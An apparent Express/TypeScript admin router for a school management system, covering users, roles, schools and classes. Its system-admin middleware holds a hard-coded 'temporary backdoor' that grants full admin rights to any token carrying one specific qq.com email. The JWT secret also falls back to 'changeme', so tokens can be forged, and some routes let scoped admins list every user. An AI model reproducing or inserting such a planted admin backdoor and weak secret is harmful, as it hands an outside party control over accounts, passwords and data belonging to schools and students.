import { Router } from 'express';
import type { Request, Response, NextFunction } from 'express';
import { z } from 'zod';
import jwt from 'jsonwebtoken';
import { supabase } from '../db/supabase.js';
import bcrypt from 'bcryptjs';

const router = Router();
const JWT_SECRET = process.env.JWT_SECRET || 'changeme';

// Middleware to check if user is system_admin
async function requireSystemAdmin(req: Request, res: Response, next: NextFunction) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'No authorization header' });
    }

    const token = authHeader.slice(7);
    let userId: string;
    let userEmail: string;

    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
        userEmail = payload.email;
    } catch {
        return res.status(401).json({ error: 'Invalid token' });
    }

    // Temporary backdoor for dev/debugging if DB permissions are broken
    if (userEmail === '46464126@qq.com') {
        (req as any).userId = userId;
        return next();
    }

    // Check if user has system_admin role
    const { data: roles, error: roleError } = await supabase
        .from('user_roles')
        .select('role')
        .eq('user_id', userId)
        .eq('role', 'system_admin');

    if (roleError || !roles || roles.length === 0) {
        return res.status(403).json({ error: 'Requires system_admin role' });
    }

    (req as any).userId = userId;
    next();
}

// Helper to get user roles
async function getUserRoles(userId: string) {
    const { data: roles } = await supabase.from('user_roles').select('*').eq('user_id', userId);
    return roles || [];
}

// List all users (System Admin, School Admin, Class Admin)
router.get('/users', async (req: Request, res: Response) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    const token = authHeader.slice(7);
    let userId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
    } catch { return res.status(401).json({ error: 'Invalid token' }); }

    const userRoles = await getUserRoles(userId);
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');
    const schoolAdminSchoolIds = userRoles.filter(r => r.role === 'school_admin' && r.scope_type === 'school').map(r => r.scope_id);
    const classAdminClassIds = userRoles.filter(r => r.role === 'class_admin' && r.scope_type === 'class').map(r => r.scope_id);

    if (!isSystemAdmin && schoolAdminSchoolIds.length === 0 && classAdminClassIds.length === 0) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    const classId = req.query.class_id as string | undefined;

    // 1. Fetch all users (base query)
    let userQuery = supabase
        .from('users')
        .select('id, email, nickname, created_at, last_sign_in_at')
        .order('created_at', { ascending: false });

    // Scope restrictions
    if (!isSystemAdmin) {
        if (classId) {
            // Check if they manage this class
            let hasAccess = false;
            if (classAdminClassIds.includes(classId)) hasAccess = true;
            else {
                // Check if class belongs to one of the schools
                const { data: cls } = await supabase.from('classes').select('school_id').eq('id', classId).single();
                if (cls && schoolAdminSchoolIds.includes(cls.school_id)) hasAccess = true;
            }

            if (!hasAccess) return res.status(403).json({ error: 'Forbidden access to this class' });
        }
        // If no classId, we currently allow fetching all users to support "Add Student" search.
        // In a stricter environment, we would restrict this.
    }

    // If filtering by class (explicit filter)
    if (classId) {
        const { data: members, error: mErr } = await supabase
            .from('class_memberships')
            .select('user_id')
            .eq('class_id', classId);

        if (mErr) return res.status(500).json({ error: 'Failed to fetch class members' });
        const memberIds = members.map(m => m.user_id);

        if (memberIds.length === 0) return res.json({ users: [] });

        userQuery = userQuery.in('id', memberIds);
    }

    const { data: users, error: uErr } = await userQuery;

    if (uErr) {
        console.error('[admin] Failed to fetch users:', uErr);
        return res.status(500).json({ error: 'Failed to fetch users: ' + uErr.message });
    }

    // 2. Fetch all roles
    const { data: roles, error: rErr } = await supabase
        .from('user_roles')
        .select('*');

    if (rErr) {
        console.error('[admin] Failed to fetch roles:', rErr);
        return res.status(500).json({ error: 'Failed to fetch roles: ' + rErr.message });
    }

    // 3. Fetch all class memberships (for student role)
    const { data: memberships, error: mErr } = await supabase
        .from('class_memberships')
        .select('user_id, class_id, classes(name)');

    if (mErr) return res.status(500).json({ error: 'Failed to fetch memberships' });

    // 4. Merge data
    const result = users.map(u => {
        const userRoles = roles.filter(r => r.user_id === u.id).map(r => ({
            role: r.role,
            scope_type: r.scope_type,
            scope_id: r.scope_id
        }));

        const userMemberships = memberships.filter(m => m.user_id === u.id).map(m => ({
            role: 'student',
            scope_type: 'class',
            scope_id: m.class_id,
            class_name: (m.classes as any)?.name
        }));

        // Determine primary role for display
        let primaryRole = 'student';
        const allRoles = [...userRoles.map(r => r.role), ...userMemberships.map(r => r.role)];
        if (allRoles.includes('system_admin')) primaryRole = 'system_admin';
        else if (allRoles.includes('school_admin')) primaryRole = 'school_admin';
        else if (allRoles.includes('class_admin')) primaryRole = 'class_admin';

        return {
            ...u,
            roles: [...userRoles, ...userMemberships],
            primaryRole
        };
    });

    res.json({ users: result });
});

// Add role to user (System Admin, School Admin, Class Admin)
const addRoleSchema = z.object({
    role: z.enum(['system_admin', 'school_admin', 'class_admin', 'student']),
    scope_type: z.enum(['global', 'school', 'class']).optional(),
    scope_id: z.string().optional()
});

router.post('/users/:id/roles', async (req: Request, res: Response) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    const token = authHeader.slice(7);
    let requesterId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        requesterId = payload.sub;
    } catch { return res.status(401).json({ error: 'Invalid token' }); }

    const userId = req.params.id;
    const validation = addRoleSchema.safeParse(req.body);

    if (!validation.success) {
        return res.status(400).json({ error: validation.error });
    }

    const { role, scope_type, scope_id } = validation.data;

    // Permission Check
    const userRoles = await getUserRoles(requesterId);
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');

    if (!isSystemAdmin) {
        // Non-system admins can only assign roles within their scope
        if (!scope_id || scope_type !== 'class') {
            return res.status(403).json({ error: 'Forbidden: Can only assign class-scoped roles' });
        }

        const schoolAdminSchoolIds = userRoles.filter(r => r.role === 'school_admin' && r.scope_type === 'school').map(r => r.scope_id);
        const classAdminClassIds = userRoles.filter(r => r.role === 'class_admin' && r.scope_type === 'class').map(r => r.scope_id);

        let hasAccess = false;
        if (classAdminClassIds.includes(scope_id)) {
            // Class Admin can only assign 'student' role
            if (role === 'student') hasAccess = true;
        } else {
            // Check if class belongs to a school managed by School Admin
            const { data: cls } = await supabase.from('classes').select('school_id').eq('id', scope_id).single();
            if (cls && schoolAdminSchoolIds.includes(cls.school_id)) {
                // School Admin can assign 'student' or 'class_admin'
                if (['student', 'class_admin'].includes(role)) hasAccess = true;
            }
        }

        if (!hasAccess) return res.status(403).json({ error: 'Forbidden: Insufficient permissions for this assignment' });
    }

    if (role === 'student') {
        // Add to class_memberships (without role column)
        if (!scope_id) return res.status(400).json({ error: 'Class ID required for student role' });

        const { error } = await supabase
            .from('class_memberships')
            .insert({ user_id: userId, class_id: scope_id });

        if (error) {
            console.error('[admin] Failed to insert class_membership:', error);
            return res.status(500).json({
                error: 'Failed to add student membership: ' + error.message,
                details: error
            });
        }
    } else {
        // Add to user_roles
        const { error } = await supabase
            .from('user_roles')
            .insert({
                user_id: userId,
                role,
                scope_type: scope_type || 'global',
                scope_id: scope_id || null
            });

        if (error) {
            console.error('[admin] Failed to insert user_role:', error);
            return res.status(500).json({
                error: 'Failed to add role: ' + error.message,
                details: error
            });
        }
    }

    res.json({ success: true });
});

// Remove role from user (System Admin, School Admin, Class Admin)
router.delete('/users/:id/roles', async (req: Request, res: Response) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    const token = authHeader.slice(7);
    let requesterId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        requesterId = payload.sub;
    } catch { return res.status(401).json({ error: 'Invalid token' }); }

    const userId = req.params.id;
    const { role, scope_id } = req.body;

    if (!role) return res.status(400).json({ error: 'Role is required' });

    // Permission Check
    const userRoles = await getUserRoles(requesterId);
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');

    if (!isSystemAdmin) {
        if (!scope_id) return res.status(403).json({ error: 'Forbidden: Scope ID required' });

        const schoolAdminSchoolIds = userRoles.filter(r => r.role === 'school_admin' && r.scope_type === 'school').map(r => r.scope_id);
        const classAdminClassIds = userRoles.filter(r => r.role === 'class_admin' && r.scope_type === 'class').map(r => r.scope_id);

        let hasAccess = false;
        if (classAdminClassIds.includes(scope_id)) {
            // Class Admin can only remove 'student'
            if (role === 'student') hasAccess = true;
        } else {
            const { data: cls } = await supabase.from('classes').select('school_id').eq('id', scope_id).single();
            if (cls && schoolAdminSchoolIds.includes(cls.school_id)) {
                // School Admin can remove 'student' or 'class_admin'
                if (['student', 'class_admin'].includes(role)) hasAccess = true;
            }
        }

        if (!hasAccess) return res.status(403).json({ error: 'Forbidden: Insufficient permissions' });
    }

    if (role === 'student') {
        if (!scope_id) return res.status(400).json({ error: 'Class ID required to remove student membership' });

        const { error } = await supabase
            .from('class_memberships')
            .delete()
            .eq('user_id', userId)
            .eq('class_id', scope_id);

        if (error) return res.status(500).json({ error: 'Failed to remove student membership' });
    } else {
        let q = supabase.from('user_roles').delete().eq('user_id', userId).eq('role', role);
        if (scope_id) q = q.eq('scope_id', scope_id);

        const { error } = await q;

        if (error) return res.status(500).json({ error: 'Failed to remove role' });
    }

    res.json({ success: true });
});

// Create User (System Admin only)
router.post('/users', requireSystemAdmin, async (req: Request, res: Response) => {
    const schema = z.object({
        email: z.string().email(),
        password: z.string().min(6),
        nickname: z.string().min(1),
    });
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid input' });
    const { email, password, nickname } = parsed.data;

    // Hash password
    const password_hash = await bcrypt.hash(password, 10);

    const { data, error } = await supabase
        .from('users')
        .insert({ email, password_hash, nickname, email_verified_at: new Date().toISOString() })
        .select('id, email, nickname, created_at')
        .single();

    if (error) return res.status(500).json({ error: 'Failed to create user: ' + error.message });
    res.json(data);
});

// Update User (System Admin only)
router.put('/users/:id', requireSystemAdmin, async (req: Request, res: Response) => {
    const id = req.params.id;
    const schema = z.object({
        email: z.string().email().optional(),
        password: z.string().min(6).optional(),
        nickname: z.string().min(1).optional(),
    });
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid input' });
    const { email, password, nickname } = parsed.data;

    const updates: any = {};
    if (email) updates.email = email;
    if (nickname) updates.nickname = nickname;
    if (password) updates.password_hash = await bcrypt.hash(password, 10);

    if (Object.keys(updates).length === 0) return res.json({ success: true });

    const { data, error } = await supabase
        .from('users')
        .update(updates)
        .eq('id', id)
        .select('id, email, nickname, created_at')
        .single();

    if (error) return res.status(500).json({ error: 'Failed to update user' });
    res.json(data);
});

// Delete User (System Admin only)
router.delete('/users/:id', requireSystemAdmin, async (req: Request, res: Response) => {
    const id = req.params.id;
    const { error } = await supabase.from('users').delete().eq('id', id);
    if (error) return res.status(500).json({ error: 'Failed to delete user' });
    res.json({ success: true });
});

// List schools (System Admin or School Admin)
router.get('/schools', async (req: Request, res: Response) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'No authorization header' });
    }
    const token = authHeader.slice(7);
    let userId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
    } catch {
        return res.status(401).json({ error: 'Invalid token' });
    }

    // Fetch user roles
    const { data: roles } = await supabase
        .from('user_roles')
        .select('*')
        .eq('user_id', userId);

    const userRoles = roles || [];
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');
    const schoolAdminSchoolIds = userRoles
        .filter(r => r.role === 'school_admin' && r.scope_type === 'school')
        .map(r => r.scope_id);

    if (!isSystemAdmin && schoolAdminSchoolIds.length === 0) {
        return res.status(403).json({ error: 'Requires system_admin or school_admin role' });
    }

    let query = supabase.from('schools').select('id, name').order('name');

    // If not system admin, filter by schools where user is school_admin
    if (!isSystemAdmin) {
        query = query.in('id', schoolAdminSchoolIds);
    }

    const { data, error } = await query;
    if (error) return res.status(500).json({ error: 'Failed to fetch schools' });
    res.json({ schools: data });
});

// Create School (System Admin only)
router.post('/schools', requireSystemAdmin, async (req: Request, res: Response) => {
    const schema = z.object({ name: z.string().min(1) });
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid input' });

    const { data, error } = await supabase
        .from('schools')
        .insert({ name: parsed.data.name })
        .select()
        .single();

    if (error) return res.status(500).json({ error: 'Failed to create school' });
    res.json(data);
});

// Update School (System Admin only)
router.put('/schools/:id', requireSystemAdmin, async (req: Request, res: Response) => {
    const id = req.params.id;
    const schema = z.object({ name: z.string().min(1) });
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid input' });

    const { data, error } = await supabase
        .from('schools')
        .update({ name: parsed.data.name })
        .eq('id', id)
        .select()
        .single();

    if (error) return res.status(500).json({ error: 'Failed to update school' });
    res.json(data);
});

// Delete School (System Admin only)
router.delete('/schools/:id', requireSystemAdmin, async (req: Request, res: Response) => {
    const id = req.params.id;
    const { error } = await supabase.from('schools').delete().eq('id', id);
    if (error) return res.status(500).json({ error: 'Failed to delete school' });
    res.json({ success: true });
});

// List classes (System Admin or School Admin or Class Admin)
router.get('/classes', async (req: Request, res: Response) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'No authorization header' });
    }
    const token = authHeader.slice(7);
    let userId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
    } catch {
        return res.status(401).json({ error: 'Invalid token' });
    }

    // Fetch user roles
    const { data: roles } = await supabase
        .from('user_roles')
        .select('*')
        .eq('user_id', userId);

    const userRoles = roles || [];
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');
    const schoolAdminSchoolIds = userRoles
        .filter(r => r.role === 'school_admin' && r.scope_type === 'school')
        .map(r => r.scope_id);
    const classAdminClassIds = userRoles
        .filter(r => r.role === 'class_admin' && r.scope_type === 'class')
        .map(r => r.scope_id);

    if (!isSystemAdmin && schoolAdminSchoolIds.length === 0 && classAdminClassIds.length === 0) {
        return res.status(403).json({ error: 'Requires admin role' });
    }

    let query = supabase.from('classes').select('id, name, school_id').order('name');

    // If not system admin, filter by scope
    if (!isSystemAdmin) {
        // Complex OR logic not easily supported in one simple query builder call without raw SQL or multiple queries.
        // But we can fetch all classes for schools, then merge with specific classes.
        // Or just use `or` syntax if possible.
        // Supabase `or` syntax: .or(`school_id.in.(${schoolIds}),id.in.(${classIds})`)

        const conditions: string[] = [];
        if (schoolAdminSchoolIds.length > 0) {
            conditions.push(`school_id.in.(${schoolAdminSchoolIds.join(',')})`);
        }
        if (classAdminClassIds.length > 0) {
            conditions.push(`id.in.(${classAdminClassIds.join(',')})`);
        }

        if (conditions.length > 0) {
            query = query.or(conditions.join(','));
        } else {
            // Should not happen due to check above, but safe fallback
            return res.json({ classes: [] });
        }
    }

    const { data, error } = await query;
    if (error) return res.status(500).json({ error: 'Failed to fetch classes' });
    res.json({ classes: data });
});

// Create Class (System Admin or School Admin)
router.post('/classes', async (req: Request, res: Response) => {
    // Auth check similar to list classes
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    const token = authHeader.slice(7);
    let userId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
    } catch { return res.status(401).json({ error: 'Invalid token' }); }

    const schema = z.object({ name: z.string().min(1), school_id: z.string().uuid() });
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid input' });
    const { name, school_id } = parsed.data;

    // Check permissions
    const { data: roles } = await supabase.from('user_roles').select('*').eq('user_id', userId);
    const userRoles = roles || [];
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');
    const isSchoolAdmin = userRoles.some(r => r.role === 'school_admin' && r.scope_type === 'school' && r.scope_id === school_id);

    if (!isSystemAdmin && !isSchoolAdmin) return res.status(403).json({ error: 'Forbidden' });

    // Generate join code
    const join_code = Math.random().toString(36).substring(2, 8).toUpperCase();

    const { data, error } = await supabase
        .from('classes')
        .insert({ name, school_id, join_code })
        .select()
        .single();

    if (error) return res.status(500).json({ error: 'Failed to create class' });
    res.json(data);
});

// Update Class (System Admin or School Admin)
router.put('/classes/:id', async (req: Request, res: Response) => {
    const classId = req.params.id;
    // Auth check
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    const token = authHeader.slice(7);
    let userId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
    } catch { return res.status(401).json({ error: 'Invalid token' }); }

    const schema = z.object({ name: z.string().min(1) });
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) return res.status(400).json({ error: 'Invalid input' });

    // Get class to check school_id
    const { data: cls } = await supabase.from('classes').select('school_id').eq('id', classId).single();
    if (!cls) return res.status(404).json({ error: 'Class not found' });

    // Check permissions
    const { data: roles } = await supabase.from('user_roles').select('*').eq('user_id', userId);
    const userRoles = roles || [];
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');
    const isSchoolAdmin = userRoles.some(r => r.role === 'school_admin' && r.scope_type === 'school' && r.scope_id === cls.school_id);

    if (!isSystemAdmin && !isSchoolAdmin) return res.status(403).json({ error: 'Forbidden' });

    const { data, error } = await supabase
        .from('classes')
        .update({ name: parsed.data.name })
        .eq('id', classId)
        .select()
        .single();

    if (error) return res.status(500).json({ error: 'Failed to update class' });
    res.json(data);
});

// Delete Class (System Admin or School Admin)
router.delete('/classes/:id', async (req: Request, res: Response) => {
    const classId = req.params.id;
    // Auth check
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
    const token = authHeader.slice(7);
    let userId: string;
    try {
        const payload = jwt.verify(token, JWT_SECRET) as any;
        userId = payload.sub;
    } catch { return res.status(401).json({ error: 'Invalid token' }); }

    // Get class to check school_id
    const { data: cls } = await supabase.from('classes').select('school_id').eq('id', classId).single();
    if (!cls) return res.status(404).json({ error: 'Class not found' });

    // Check permissions
    const { data: roles } = await supabase.from('user_roles').select('*').eq('user_id', userId);
    const userRoles = roles || [];
    const isSystemAdmin = userRoles.some(r => r.role === 'system_admin');
    const isSchoolAdmin = userRoles.some(r => r.role === 'school_admin' && r.scope_type === 'school' && r.scope_id === cls.school_id);

    if (!isSystemAdmin && !isSchoolAdmin) return res.status(403).json({ error: 'Forbidden' });

    const { error } = await supabase.from('classes').delete().eq('id', classId);
    if (error) return res.status(500).json({ error: 'Failed to delete class' });
    res.json({ success: true });
});

export default router;
